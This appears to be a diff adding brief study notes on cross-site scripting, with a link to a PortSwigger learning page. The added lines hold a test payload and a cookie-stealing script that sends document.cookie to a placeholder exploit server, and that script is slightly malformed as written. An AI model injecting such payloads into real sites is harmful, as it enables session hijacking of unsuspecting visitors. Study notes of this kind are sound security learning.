@@ -1,3 +1,6 @@
+Payloads eg: <U>test123 , <script>alert(xss)</script>
+exploit eg:  <script>document.location"https://exploit-server-link"+document.cookie</script>
+(this extract the cookie of any user who visit xss vulnerable )
 
 Link: https://portswigger.net/web-security/cross-site-scripting#what-is-cross-site-scripting-xss
 
